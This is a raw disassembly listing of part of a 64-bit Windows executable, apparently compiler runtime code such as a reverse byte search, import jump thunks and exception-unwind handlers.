   14000953e:	48 83 ec 20          	sub    $0x20,%rsp
   140009542:	48 8d 1d ef 61 00 00 	lea    0x61ef(%rip),%rbx        # 0x14000f738
   140009549:	48 8d 3d e8 61 00 00 	lea    0x61e8(%rip),%rdi        # 0x14000f738
   140009550:	eb 12                	jmp    0x140009564
   140009552:	48 8b 03             	mov    (%rbx),%rax
   140009555:	48 85 c0             	test   %rax,%rax
   140009558:	74 06                	je     0x140009560
   14000955a:	ff 15 b0 1e 00 00    	call   *0x1eb0(%rip)        # 0x14000b410
   140009560:	48 83 c3 08          	add    $0x8,%rbx
   140009564:	48 3b df             	cmp    %rdi,%rbx
   140009567:	72 e9                	jb     0x140009552
   140009569:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000956e:	48 83 c4 20          	add    $0x20,%rsp
   140009572:	5f                   	pop    %rdi
   140009573:	c3                   	ret
   140009574:	cc                   	int3
   140009575:	cc                   	int3
   140009576:	cc                   	int3
   140009577:	cc                   	int3
   140009578:	cc                   	int3
   140009579:	cc                   	int3
   14000957a:	cc                   	int3
   14000957b:	cc                   	int3
   14000957c:	cc                   	int3
   14000957d:	cc                   	int3
   14000957e:	cc                   	int3
   14000957f:	cc                   	int3
   140009580:	ff 25 3a 1c 00 00    	jmp    *0x1c3a(%rip)        # 0x14000b1c0
   140009586:	cc                   	int3
   140009587:	cc                   	int3
   140009588:	40 53                	rex push %rbx
   14000958a:	48 83 ec 20          	sub    $0x20,%rsp
   14000958e:	48 8b d9             	mov    %rcx,%rbx
   140009591:	b9 10 00 00 00       	mov    $0x10,%ecx
   140009596:	ff 15 0c 1d 00 00    	call   *0x1d0c(%rip)        # 0x14000b2a8
   14000959c:	48 8b d0             	mov    %rax,%rdx
   14000959f:	48 85 c0             	test   %rax,%rax
   1400095a2:	74 1b                	je     0x1400095bf
   1400095a4:	48 8b 05 95 6e 01 00 	mov    0x16e95(%rip),%rax        # 0x140020440
   1400095ab:	48 89 02             	mov    %rax,(%rdx)
   1400095ae:	48 89 5a 08          	mov    %rbx,0x8(%rdx)
   1400095b2:	48 89 15 87 6e 01 00 	mov    %rdx,0x16e87(%rip)        # 0x140020440
   1400095b9:	48 83 c4 20          	add    $0x20,%rsp
   1400095bd:	5b                   	pop    %rbx
   1400095be:	c3                   	ret
   1400095bf:	e8 97 01 00 00       	call   0x14000975b
   1400095c4:	cc                   	int3
   1400095c5:	cc                   	int3
   1400095c6:	cc                   	int3
   1400095c7:	cc                   	int3
   1400095c8:	cc                   	int3
   1400095c9:	cc                   	int3
   1400095ca:	cc                   	int3
   1400095cb:	cc                   	int3
   1400095cc:	cc                   	int3
   1400095cd:	cc                   	int3
   1400095ce:	cc                   	int3
   1400095cf:	cc                   	int3
   1400095d0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400095d5:	8b 05 b9 8a 00 00    	mov    0x8ab9(%rip),%eax        # 0x140012094
   1400095db:	4c 8b ca             	mov    %rdx,%r9
   1400095de:	4c 2b c9             	sub    %rcx,%r9
   1400095e1:	4c 8b d1             	mov    %rcx,%r10
   1400095e4:	4d 8b d9             	mov    %r9,%r11
   1400095e7:	48 8b da             	mov    %rdx,%rbx
   1400095ea:	49 83 e3 e0          	and    $0xffffffffffffffe0,%r11
   1400095ee:	0f 84 c2 00 00 00    	je     0x1400096b6
   1400095f4:	a8 20                	test   $0x20,%al
   1400095f6:	0f 84 ba 00 00 00    	je     0x1400096b6
   1400095fc:	41 0f be c0          	movsbl %r8b,%eax
   140009600:	48 8b ca             	mov    %rdx,%rcx
   140009603:	c5 f9 6e d8          	vmovd  %eax,%xmm3
   140009607:	c5 f9 ef c0          	vpxor  %xmm0,%xmm0,%xmm0
   14000960b:	c4 e2 61 00 d8       	vpshufb %xmm0,%xmm3,%xmm3
   140009610:	c4 e3 65 18 db 01    	vinsertf128 $0x1,%xmm3,%ymm3,%ymm3
   140009616:	49 2b cb             	sub    %r11,%rcx
   140009619:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140009620:	c5 e5 74 4a e0       	vpcmpeqb -0x20(%rdx),%ymm3,%ymm1
   140009625:	48 83 ea 20          	sub    $0x20,%rdx
   140009629:	c5 fd d7 c1          	vpmovmskb %ymm1,%eax
   14000962d:	85 c0                	test   %eax,%eax
   14000962f:	75 6c                	jne    0x14000969d
   140009631:	48 3b d1             	cmp    %rcx,%rdx
   140009634:	75 ea                	jne    0x140009620
   140009636:	41 83 e1 1c          	and    $0x1c,%r9d
   14000963a:	74 43                	je     0x14000967f
   14000963c:	49 2b d1             	sub    %r9,%rdx
   14000963f:	48 8d 05 7a 44 00 00 	lea    0x447a(%rip),%rax        # 0x14000dac0
   140009646:	49 83 e1 fc          	and    $0xfffffffffffffffc,%r9
   14000964a:	49 2b c1             	sub    %r9,%rax
   14000964d:	c5 fe 6f 10          	vmovdqu (%rax),%ymm2
   140009651:	c4 e2 6d 8c 02       	vpmaskmovd (%rdx),%ymm2,%ymm0
   140009656:	c5 fd 74 cb          	vpcmpeqb %ymm3,%ymm0,%ymm1
   14000965a:	c5 f5 db d2          	vpand  %ymm2,%ymm1,%ymm2
   14000965e:	c5 fd d7 c2          	vpmovmskb %ymm2,%eax
   140009662:	85 c0                	test   %eax,%eax
   140009664:	74 19                	je     0x14000967f
   140009666:	f3 0f bd c0          	lzcnt  %eax,%eax
   14000966a:	b9 1f 00 00 00       	mov    $0x1f,%ecx
   14000966f:	2b c8                	sub    %eax,%ecx
   140009671:	8b c1                	mov    %ecx,%eax
   140009673:	48 03 c2             	add    %rdx,%rax
   140009676:	c5 f8 77             	vzeroupper
   140009679:	48 8b 5c 24 08       	mov    0x8(%rsp),%rbx
   14000967e:	c3                   	ret
   14000967f:	c5 f8 77             	vzeroupper
   140009682:	49 3b d2             	cmp    %r10,%rdx
   140009685:	74 0d                	je     0x140009694
   140009687:	48 ff ca             	dec    %rdx
   14000968a:	44 38 02             	cmp    %r8b,(%rdx)
   14000968d:	74 79                	je     0x140009708
   14000968f:	49 3b d2             	cmp    %r10,%rdx
   140009692:	75 f3                	jne    0x140009687
   140009694:	48 8b c3             	mov    %rbx,%rax
   140009697:	48 8b 5c 24 08       	mov    0x8(%rsp),%rbx
   14000969c:	c3                   	ret
   14000969d:	c5 f8 77             	vzeroupper
   1400096a0:	f3 0f bd c0          	lzcnt  %eax,%eax
   1400096a4:	b9 1f 00 00 00       	mov    $0x1f,%ecx
   1400096a9:	2b c8                	sub    %eax,%ecx
   1400096ab:	8b c1                	mov    %ecx,%eax
   1400096ad:	48 03 c2             	add    %rdx,%rax
   1400096b0:	48 8b 5c 24 08       	mov    0x8(%rsp),%rbx
   1400096b5:	c3                   	ret
   1400096b6:	49 83 e1 f0          	and    $0xfffffffffffffff0,%r9
   1400096ba:	74 c6                	je     0x140009682
   1400096bc:	a8 04                	test   $0x4,%al
   1400096be:	74 c2                	je     0x140009682
   1400096c0:	41 0f b6 c0          	movzbl %r8b,%eax
   1400096c4:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400096c7:	48 8b ca             	mov    %rdx,%rcx
   1400096ca:	49 2b c9             	sub    %r9,%rcx
   1400096cd:	66 0f 6e c8          	movd   %eax,%xmm1
   1400096d1:	66 0f 38 00 c8       	pshufb %xmm0,%xmm1
   1400096d6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   1400096dd:	00 00 00 
   1400096e0:	f3 0f 6f 42 f0       	movdqu -0x10(%rdx),%xmm0
   1400096e5:	48 83 ea 10          	sub    $0x10,%rdx
   1400096e9:	66 0f 74 c1          	pcmpeqb %xmm1,%xmm0
   1400096ed:	66 0f d7 c0          	pmovmskb %xmm0,%eax
   1400096f1:	85 c0                	test   %eax,%eax
   1400096f3:	75 07                	jne    0x1400096fc
   1400096f5:	48 3b d1             	cmp    %rcx,%rdx
   1400096f8:	75 e6                	jne    0x1400096e0
   1400096fa:	eb 86                	jmp    0x140009682
   1400096fc:	0f bd c0             	bsr    %eax,%eax
   1400096ff:	48 03 c2             	add    %rdx,%rax
   140009702:	48 8b 5c 24 08       	mov    0x8(%rsp),%rbx
   140009707:	c3                   	ret
   140009708:	48 8b 5c 24 08       	mov    0x8(%rsp),%rbx
   14000970d:	48 8b c2             	mov    %rdx,%rax
   140009710:	c3                   	ret
   140009711:	cc                   	int3
   140009712:	cc                   	int3
   140009713:	cc                   	int3
   140009714:	cc                   	int3
   140009715:	cc                   	int3
   140009716:	cc                   	int3
   140009717:	cc                   	int3
   140009718:	cc                   	int3
   140009719:	cc                   	int3
   14000971a:	cc                   	int3
   14000971b:	cc                   	int3
   14000971c:	cc                   	int3
   14000971d:	cc                   	int3
   14000971e:	cc                   	int3
   14000971f:	cc                   	int3
   140009720:	e9 ab fe ff ff       	jmp    0x1400095d0
   140009725:	ff 25 05 1a 00 00    	jmp    *0x1a05(%rip)        # 0x14000b130
   14000972b:	ff 25 07 1a 00 00    	jmp    *0x1a07(%rip)        # 0x14000b138
   140009731:	ff 25 09 1a 00 00    	jmp    *0x1a09(%rip)        # 0x14000b140
   140009737:	ff 25 0b 1a 00 00    	jmp    *0x1a0b(%rip)        # 0x14000b148
   14000973d:	ff 25 0d 1a 00 00    	jmp    *0x1a0d(%rip)        # 0x14000b150
   140009743:	ff 25 0f 1a 00 00    	jmp    *0x1a0f(%rip)        # 0x14000b158
   140009749:	ff 25 11 1a 00 00    	jmp    *0x1a11(%rip)        # 0x14000b160
   14000974f:	ff 25 13 1a 00 00    	jmp    *0x1a13(%rip)        # 0x14000b168
   140009755:	ff 25 15 1a 00 00    	jmp    *0x1a15(%rip)        # 0x14000b170
   14000975b:	ff 25 4f 1a 00 00    	jmp    *0x1a4f(%rip)        # 0x14000b1b0
   140009761:	ff 25 11 1b 00 00    	jmp    *0x1b11(%rip)        # 0x14000b278
   140009767:	ff 25 d3 1a 00 00    	jmp    *0x1ad3(%rip)        # 0x14000b240
   14000976d:	ff 25 c5 1a 00 00    	jmp    *0x1ac5(%rip)        # 0x14000b238
   140009773:	ff 25 b7 1a 00 00    	jmp    *0x1ab7(%rip)        # 0x14000b230
   140009779:	ff 25 d9 1a 00 00    	jmp    *0x1ad9(%rip)        # 0x14000b258
   14000977f:	ff 25 a3 1a 00 00    	jmp    *0x1aa3(%rip)        # 0x14000b228
   140009785:	ff 25 95 1a 00 00    	jmp    *0x1a95(%rip)        # 0x14000b220
   14000978b:	ff 25 cf 1a 00 00    	jmp    *0x1acf(%rip)        # 0x14000b260
   140009791:	ff 25 09 1b 00 00    	jmp    *0x1b09(%rip)        # 0x14000b2a0
   140009797:	ff 25 0b 1b 00 00    	jmp    *0x1b0b(%rip)        # 0x14000b2a8
   14000979d:	ff 25 9d 1b 00 00    	jmp    *0x1b9d(%rip)        # 0x14000b340
   1400097a3:	ff 25 af 1b 00 00    	jmp    *0x1baf(%rip)        # 0x14000b358
   1400097a9:	ff 25 c9 1b 00 00    	jmp    *0x1bc9(%rip)        # 0x14000b378
   1400097af:	ff 25 ab 1b 00 00    	jmp    *0x1bab(%rip)        # 0x14000b360
   1400097b5:	ff 25 7d 1b 00 00    	jmp    *0x1b7d(%rip)        # 0x14000b338
   1400097bb:	ff 25 a7 1b 00 00    	jmp    *0x1ba7(%rip)        # 0x14000b368
   1400097c1:	ff 25 69 1b 00 00    	jmp    *0x1b69(%rip)        # 0x14000b330
   1400097c7:	ff 25 4b 1b 00 00    	jmp    *0x1b4b(%rip)        # 0x14000b318
   1400097cd:	ff 25 05 1b 00 00    	jmp    *0x1b05(%rip)        # 0x14000b2d8
   1400097d3:	ff 25 0f 1b 00 00    	jmp    *0x1b0f(%rip)        # 0x14000b2e8
   1400097d9:	ff 25 11 1b 00 00    	jmp    *0x1b11(%rip)        # 0x14000b2f0
   1400097df:	ff 25 13 1b 00 00    	jmp    *0x1b13(%rip)        # 0x14000b2f8
   1400097e5:	ff 25 15 1b 00 00    	jmp    *0x1b15(%rip)        # 0x14000b300
   1400097eb:	ff 25 17 1b 00 00    	jmp    *0x1b17(%rip)        # 0x14000b308
   1400097f1:	ff 25 f1 1b 00 00    	jmp    *0x1bf1(%rip)        # 0x14000b3e8
   1400097f7:	ff 25 13 1b 00 00    	jmp    *0x1b13(%rip)        # 0x14000b310
   1400097fd:	ff 25 6d 1b 00 00    	jmp    *0x1b6d(%rip)        # 0x14000b370
   140009803:	ff 25 17 1b 00 00    	jmp    *0x1b17(%rip)        # 0x14000b320
   140009809:	ff 25 19 1b 00 00    	jmp    *0x1b19(%rip)        # 0x14000b328
   14000980f:	ff 25 b3 1a 00 00    	jmp    *0x1ab3(%rip)        # 0x14000b2c8
   140009815:	ff 25 9d 1a 00 00    	jmp    *0x1a9d(%rip)        # 0x14000b2b8
   14000981b:	ff 25 bf 1b 00 00    	jmp    *0x1bbf(%rip)        # 0x14000b3e0
   140009821:	ff 25 21 1b 00 00    	jmp    *0x1b21(%rip)        # 0x14000b348
   140009827:	ff 25 83 1a 00 00    	jmp    *0x1a83(%rip)        # 0x14000b2b0
   14000982d:	cc                   	int3
   14000982e:	cc                   	int3
   14000982f:	cc                   	int3
   140009830:	48 83 ec 28          	sub    $0x28,%rsp
   140009834:	4d 8b 41 38          	mov    0x38(%r9),%r8
   140009838:	48 8b ca             	mov    %rdx,%rcx
   14000983b:	49 8b d1             	mov    %r9,%rdx
   14000983e:	e8 0d 00 00 00       	call   0x140009850
   140009843:	b8 01 00 00 00       	mov    $0x1,%eax
   140009848:	48 83 c4 28          	add    $0x28,%rsp
   14000984c:	c3                   	ret
   14000984d:	cc                   	int3
   14000984e:	cc                   	int3
   14000984f:	cc                   	int3
   140009850:	40 53                	rex push %rbx
   140009852:	45 8b 18             	mov    (%r8),%r11d
   140009855:	48 8b da             	mov    %rdx,%rbx
   140009858:	41 83 e3 f8          	and    $0xfffffff8,%r11d
   14000985c:	4c 8b c9             	mov    %rcx,%r9
   14000985f:	41 f6 00 04          	testb  $0x4,(%r8)
   140009863:	4c 8b d1             	mov    %rcx,%r10
   140009866:	74 13                	je     0x14000987b
   140009868:	41 8b 40 08          	mov    0x8(%r8),%eax
   14000986c:	4d 63 50 04          	movslq 0x4(%r8),%r10
   140009870:	f7 d8                	neg    %eax
   140009872:	4c 03 d1             	add    %rcx,%r10
   140009875:	48 63 c8             	movslq %eax,%rcx
   140009878:	4c 23 d1             	and    %rcx,%r10
   14000987b:	49 63 c3             	movslq %r11d,%rax
   14000987e:	4a 8b 14 10          	mov    (%rax,%r10,1),%rdx
   140009882:	48 8b 43 10          	mov    0x10(%rbx),%rax
   140009886:	8b 48 08             	mov    0x8(%rax),%ecx
   140009889:	48 8b 43 08          	mov    0x8(%rbx),%rax
   14000988d:	f6 44 01 03 0f       	testb  $0xf,0x3(%rcx,%rax,1)
   140009892:	74 10                	je     0x1400098a4
   140009894:	0f b6 44 01 03       	movzbl 0x3(%rcx,%rax,1),%eax
   140009899:	b9 f0 ff ff ff       	mov    $0xfffffff0,%ecx
   14000989e:	48 23 c1             	and    %rcx,%rax
   1400098a1:	4c 03 c8             	add    %rax,%r9
   1400098a4:	4c 33 ca             	xor    %rdx,%r9
   1400098a7:	49 8b c9             	mov    %r9,%rcx
   1400098aa:	5b                   	pop    %rbx
   1400098ab:	e9 50 ef ff ff       	jmp    0x140008800
   1400098b0:	48 8b c4             	mov    %rsp,%rax
   1400098b3:	48 89 58 08          	mov    %rbx,0x8(%rax)
   1400098b7:	48 89 68 10          	mov    %rbp,0x10(%rax)
   1400098bb:	48 89 70 18          	mov    %rsi,0x18(%rax)
   1400098bf:	48 89 78 20          	mov    %rdi,0x20(%rax)
   1400098c3:	41 56                	push   %r14
   1400098c5:	48 83 ec 20          	sub    $0x20,%rsp
   1400098c9:	49 8b 59 38          	mov    0x38(%r9),%rbx
   1400098cd:	48 8b f2             	mov    %rdx,%rsi
   1400098d0:	4d 8b f0             	mov    %r8,%r14
   1400098d3:	48 8b e9             	mov    %rcx,%rbp
   1400098d6:	49 8b d1             	mov    %r9,%rdx
   1400098d9:	48 8b ce             	mov    %rsi,%rcx
   1400098dc:	49 8b f9             	mov    %r9,%rdi
   1400098df:	4c 8d 43 04          	lea    0x4(%rbx),%r8
   1400098e3:	e8 68 ff ff ff       	call   0x140009850
   1400098e8:	8b 45 04             	mov    0x4(%rbp),%eax
   1400098eb:	24 66                	and    $0x66,%al
   1400098ed:	f6 d8                	neg    %al
   1400098ef:	b8 01 00 00 00       	mov    $0x1,%eax
   1400098f4:	45 1b c9             	sbb    %r9d,%r9d
   1400098f7:	41 f7 d9             	neg    %r9d
   1400098fa:	44 03 c8             	add    %eax,%r9d
   1400098fd:	44 85 4b 04          	test   %r9d,0x4(%rbx)
   140009901:	74 11                	je     0x140009914
   140009903:	4c 8b cf             	mov    %rdi,%r9
   140009906:	4d 8b c6             	mov    %r14,%r8
   140009909:	48 8b d6             	mov    %rsi,%rdx
   14000990c:	48 8b cd             	mov    %rbp,%rcx
   14000990f:	e8 4d fe ff ff       	call   0x140009761
   140009914:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140009919:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   14000991e:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140009923:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   140009928:	48 83 c4 20          	add    $0x20,%rsp
   14000992c:	41 5e                	pop    %r14
   14000992e:	c3                   	ret
   14000992f:	ff 25 33 19 00 00    	jmp    *0x1933(%rip)        # 0x14000b268
   140009935:	cc                   	int3
   140009936:	cc                   	int3
   140009937:	cc                   	int3
   140009938:	cc                   	int3
   140009939:	cc                   	int3
   14000993a:	cc                   	int3
   14000993b:	cc                   	int3
   14000993c:	cc                   	int3
   14000993d:	cc                   	int3
   14000993e:	cc                   	int3
   14000993f:	cc                   	int3
   140009940:	cc                   	int3
   140009941:	cc                   	int3
   140009942:	cc                   	int3
   140009943:	cc                   	int3
   140009944:	cc                   	int3
   140009945:	cc                   	int3
   140009946:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000994d:	00 00 00 
   140009950:	ff e0                	jmp    *%rax
   140009952:	cc                   	int3
   140009953:	cc                   	int3
   140009954:	cc                   	int3
   140009955:	cc                   	int3
   140009956:	cc                   	int3
   140009957:	cc                   	int3
   140009958:	cc                   	int3
   140009959:	cc                   	int3
   14000995a:	cc                   	int3
   14000995b:	cc                   	int3
   14000995c:	cc                   	int3
   14000995d:	cc                   	int3
   14000995e:	cc                   	int3
   14000995f:	cc                   	int3
   140009960:	cc                   	int3
   140009961:	cc                   	int3
   140009962:	cc                   	int3
   140009963:	cc                   	int3
   140009964:	cc                   	int3
   140009965:	cc                   	int3
   140009966:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000996d:	00 00 00 
   140009970:	ff 25 9a 1a 00 00    	jmp    *0x1a9a(%rip)        # 0x14000b410
   140009976:	cc                   	int3
   140009977:	cc                   	int3
   140009978:	cc                   	int3
   140009979:	cc                   	int3
   14000997a:	cc                   	int3
   14000997b:	cc                   	int3
   14000997c:	cc                   	int3
   14000997d:	cc                   	int3
   14000997e:	cc                   	int3
   14000997f:	cc                   	int3
   140009980:	48 8b 8a a0 00 00 00 	mov    0xa0(%rdx),%rcx
   140009987:	e9 54 ca ff ff       	jmp    0x1400063e0
   14000998c:	40 55                	rex push %rbp
   14000998e:	48 83 ec 20          	sub    $0x20,%rsp
   140009992:	48 8b ea             	mov    %rdx,%rbp
   140009995:	8b 45 50             	mov    0x50(%rbp),%eax
   140009998:	83 e0 01             	and    $0x1,%eax
   14000999b:	85 c0                	test   %eax,%eax
   14000999d:	74 0d                	je     0x1400099ac
   14000999f:	83 65 50 fe          	andl   $0xfffffffe,0x50(%rbp)
   1400099a3:	48 8d 4d 78          	lea    0x78(%rbp),%rcx
   1400099a7:	e8 34 ca ff ff       	call   0x1400063e0
   1400099ac:	48 83 c4 20          	add    $0x20,%rsp
   1400099b0:	5d                   	pop    %rbp
   1400099b1:	c3                   	ret
   1400099b2:	48 8d 8a e0 01 00 00 	lea    0x1e0(%rdx),%rcx
   1400099b9:	e9 22 ca ff ff       	jmp    0x1400063e0
   1400099be:	40 55                	rex push %rbp
   1400099c0:	48 83 ec 20          	sub    $0x20,%rsp
   1400099c4:	48 8b ea             	mov    %rdx,%rbp
   1400099c7:	8b 45 50             	mov    0x50(%rbp),%eax
   1400099ca:	83 e0 04             	and    $0x4,%eax
   1400099cd:	85 c0                	test   %eax,%eax
   1400099cf:	74 18                	je     0x1400099e9
   1400099d1:	83 65 50 fb          	andl   $0xfffffffb,0x50(%rbp)
   1400099d5:	48 8d 8d 00 02 00 00 	lea    0x200(%rbp),%rcx
   1400099dc:	48 81 c1 88 00 00 00 	add    $0x88,%rcx
   1400099e3:	ff 15 27 18 00 00    	call   *0x1827(%rip)        # 0x14000b210
   1400099e9:	48 83 c4 20          	add    $0x20,%rsp
   1400099ed:	5d                   	pop    %rbp
   1400099ee:	c3                   	ret
   1400099ef:	48 8d 8a 00 02 00 00 	lea    0x200(%rdx),%rcx
   1400099f6:	48 83 c1 10          	add    $0x10,%rcx
   1400099fa:	48 ff 25 77 17 00 00 	rex.W jmp *0x1777(%rip)        # 0x14000b178
   140009a01:	48 8d 8a 00 02 00 00 	lea    0x200(%rdx),%rcx
   140009a08:	e9 b3 b4 ff ff       	jmp    0x140004ec0
   140009a0d:	40 55                	rex push %rbp
   140009a0f:	48 83 ec 20          	sub    $0x20,%rsp
   140009a13:	48 8b ea             	mov    %rdx,%rbp
   140009a16:	8b 45 50             	mov    0x50(%rbp),%eax
   140009a19:	83 e0 10             	and    $0x10,%eax
   140009a1c:	85 c0                	test   %eax,%eax
   140009a1e:	74 0d                	je     0x140009a2d
   140009a20:	83 65 50 ef          	andl   $0xffffffef,0x50(%rbp)
   140009a24:	48 8d 4d 58          	lea    0x58(%rbp),%rcx
   140009a28:	e8 b3 c9 ff ff       	call   0x1400063e0
   140009a2d:	48 83 c4 20          	add    $0x20,%rsp
   140009a31:	5d                   	pop    %rbp
   140009a32:	c3                   	ret
   140009a33:	48 8d 8a 58 00 00 00 	lea    0x58(%rdx),%rcx
   140009a3a:	e9 a1 c9 ff ff       	jmp    0x1400063e0
   140009a3f:	48 8d 8a 30 00 00 00 	lea    0x30(%rdx),%rcx
   140009a46:	e9 95 c9 ff ff       	jmp    0x1400063e0
   140009a4b:	48 8d 8a c0 01 00 00 	lea    0x1c0(%rdx),%rcx
   140009a52:	e9 89 c9 ff ff       	jmp    0x1400063e0
   140009a57:	48 8d 8a b0 00 00 00 	lea    0xb0(%rdx),%rcx
   140009a5e:	e9 bd b4 ff ff       	jmp    0x140004f20
   140009a63:	cc                   	int3
   140009a64:	cc                   	int3
   140009a65:	cc                   	int3
   140009a66:	cc                   	int3
   140009a67:	cc                   	int3
   140009a68:	cc                   	int3
   140009a69:	cc                   	int3
   140009a6a:	cc                   	int3
   140009a6b:	cc                   	int3
   140009a6c:	cc                   	int3
   140009a6d:	cc                   	int3
   140009a6e:	cc                   	int3
   140009a6f:	cc                   	int3
   140009a70:	48 8b 8a 68 00 00 00 	mov    0x68(%rdx),%rcx
   140009a77:	e9 64 c9 ff ff       	jmp    0x1400063e0
   140009a7c:	48 8d 8a 78 00 00 00 	lea    0x78(%rdx),%rcx
   140009a83:	e9 58 c9 ff ff       	jmp    0x1400063e0
   140009a88:	cc                   	int3
   140009a89:	cc                   	int3
   140009a8a:	cc                   	int3
   140009a8b:	cc                   	int3
   140009a8c:	cc                   	int3
   140009a8d:	cc                   	int3
   140009a8e:	cc                   	int3
   140009a8f:	cc                   	int3
   140009a90:	48 8d 8a 70 00 00 00 	lea    0x70(%rdx),%rcx
   140009a97:	e9 44 c9 ff ff       	jmp    0x1400063e0
   140009a9c:	48 8d 8a 18 01 00 00 	lea    0x118(%rdx),%rcx
   140009aa3:	e9 38 c9 ff ff       	jmp    0x1400063e0
   140009aa8:	48 8d 8a f8 00 00 00 	lea    0xf8(%rdx),%rcx
   140009aaf:	e9 2c c9 ff ff       	jmp    0x1400063e0
   140009ab4:	cc                   	int3
   140009ab5:	cc                   	int3
   140009ab6:	cc                   	int3
   140009ab7:	cc                   	int3
   140009ab8:	cc                   	int3
   140009ab9:	cc                   	int3
   140009aba:	cc                   	int3
   140009abb:	cc                   	int3
   140009abc:	cc                   	int3
   140009abd:	cc                   	int3
   140009abe:	cc                   	int3
   140009abf:	cc                   	int3
   140009ac0:	48 8d 8a 20 00 00 00 	lea    0x20(%rdx),%rcx
   140009ac7:	e9 04 ea ff ff       	jmp    0x1400084d0
   140009acc:	48 8d 8a 20 00 00 00 	lea    0x20(%rdx),%rcx
   140009ad3:	e9 a8 e2 ff ff       	jmp    0x140007d80
   140009ad8:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   140009add:	55                   	push   %rbp
   140009ade:	48 83 ec 20          	sub    $0x20,%rsp
   140009ae2:	48 8b ea             	mov    %rdx,%rbp
   140009ae5:	48 8b 55 50          	mov    0x50(%rbp),%rdx
   140009ae9:	48 8b 02             	mov    (%rdx),%rax
   140009aec:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140009af0:	48 03 ca             	add    %rdx,%rcx
   140009af3:	41 b0 01             	mov    $0x1,%r8b
   140009af6:	ba 04 00 00 00       	mov    $0x4,%edx
   140009afb:	ff 15 e7 15 00 00    	call   *0x15e7(%rip)        # 0x14000b0e8
   140009b01:	90                   	nop
   140009b02:	48 b8 00 00 00 00 00 	movabs $0x0,%rax
   140009b09:	00 00 00 
   140009b0c:	48 83 c4 20          	add    $0x20,%rsp
   140009b10:	5d                   	pop    %rbp
   140009b11:	c3                   	ret
   140009b12:	cc                   	int3
   140009b13:	cc                   	int3
   140009b14:	cc                   	int3
   140009b15:	cc                   	int3
   140009b16:	cc                   	int3
   140009b17:	cc                   	int3
   140009b18:	cc                   	int3
   140009b19:	cc                   	int3
   140009b1a:	cc                   	int3
   140009b1b:	cc                   	int3
   140009b1c:	cc                   	int3
   140009b1d:	cc                   	int3
   140009b1e:	cc                   	int3
   140009b1f:	cc                   	int3
   140009b20:	48 8d 8a 58 00 00 00 	lea    0x58(%rdx),%rcx
   140009b27:	e9 b4 c8 ff ff       	jmp    0x1400063e0
   140009b2c:	cc                   	int3
   140009b2d:	cc                   	int3
   140009b2e:	cc                   	int3
   140009b2f:	cc                   	int3
   140009b30:	48 8d 8a 28 00 00 00 	lea    0x28(%rdx),%rcx
   140009b37:	48 ff 25 82 16 00 00 	rex.W jmp *0x1682(%rip)        # 0x14000b1c0
   140009b3e:	48 8d 8a 30 00 00 00 	lea    0x30(%rdx),%rcx
   140009b45:	e9 76 e2 ff ff       	jmp    0x140007dc0
   140009b4a:	cc                   	int3
   140009b4b:	cc                   	int3
   140009b4c:	cc                   	int3
   140009b4d:	cc                   	int3
   140009b4e:	cc                   	int3
   140009b4f:	cc                   	int3
   140009b50:	40 55                	rex push %rbp
   140009b52:	48 83 ec 20          	sub    $0x20,%rsp
   140009b56:	48 8b ea             	mov    %rdx,%rbp
   140009b59:	8b 45 40             	mov    0x40(%rbp),%eax
   140009b5c:	83 e0 01             	and    $0x1,%eax
   140009b5f:	85 c0                	test   %eax,%eax
   140009b61:	74 15                	je     0x140009b78
   140009b63:	83 65 40 fe          	andl   $0xfffffffe,0x40(%rbp)
   140009b67:	48 8b 4d 50          	mov    0x50(%rbp),%rcx
   140009b6b:	48 81 c1 a8 00 00 00 	add    $0xa8,%rcx
   140009b72:	ff 15 98 16 00 00    	call   *0x1698(%rip)        # 0x14000b210
   140009b78:	48 83 c4 20          	add    $0x20,%rsp
   140009b7c:	5d                   	pop    %rbp
   140009b7d:	c3                   	ret
   140009b7e:	48 8b 8a 50 00 00 00 	mov    0x50(%rdx),%rcx
   140009b85:	48 83 c1 10          	add    $0x10,%rcx
   140009b89:	48 ff 25 e8 15 00 00 	rex.W jmp *0x15e8(%rip)        # 0x14000b178
   140009b90:	48 8b 8a 50 00 00 00 	mov    0x50(%rdx),%rcx
   140009b97:	48 83 c1 08          	add    $0x8,%rcx
   140009b9b:	e9 e0 d5 ff ff       	jmp    0x140007180
   140009ba0:	48 8d 8a 70 00 00 00 	lea    0x70(%rdx),%rcx
   140009ba7:	e9 e4 7b ff ff       	jmp    0x140001790
   140009bac:	40 55                	rex push %rbp
   140009bae:	48 8b ea             	mov    %rdx,%rbp
   140009bb1:	48 8b 01             	mov    (%rcx),%rax
   140009bb4:	33 c9                	xor    %ecx,%ecx
   140009bb6:	81 38 05 00 00 c0    	cmpl   $0xc0000005,(%rax)
   140009bbc:	0f 94 c1             	sete   %cl
   140009bbf:	8b c1                	mov    %ecx,%eax
   140009bc1:	5d                   	pop    %rbp
   140009bc2:	c3                   	ret
   140009bc3:	cc                   	int3
   140009bc4:	40 55                	rex push %rbp
   140009bc6:	48 83 ec 20          	sub    $0x20,%rsp
   140009bca:	48 8b ea             	mov    %rdx,%rbp
   140009bcd:	48 8b d1             	mov    %rcx,%rdx
   140009bd0:	48 8b 09             	mov    (%rcx),%rcx
   140009bd3:	8b 09                	mov    (%rcx),%ecx
   140009bd5:	e8 e7 fb ff ff       	call   0x1400097c1
   140009bda:	90                   	nop
   140009bdb:	48 83 c4 20          	add    $0x20,%rsp
   140009bdf:	5d                   	pop    %rbp
   140009be0:	c3                   	ret
   140009be1:	cc                   	int3
   140009be2:	cc                   	int3
   140009be3:	cc                   	int3
   140009be4:	cc                   	int3
   140009be5:	cc                   	int3
   140009be6:	cc                   	int3
   140009be7:	cc                   	int3
   140009be8:	cc                   	int3
   140009be9:	cc                   	int3
   140009bea:	cc                   	int3
   140009beb:	cc                   	int3
   140009bec:	cc                   	int3
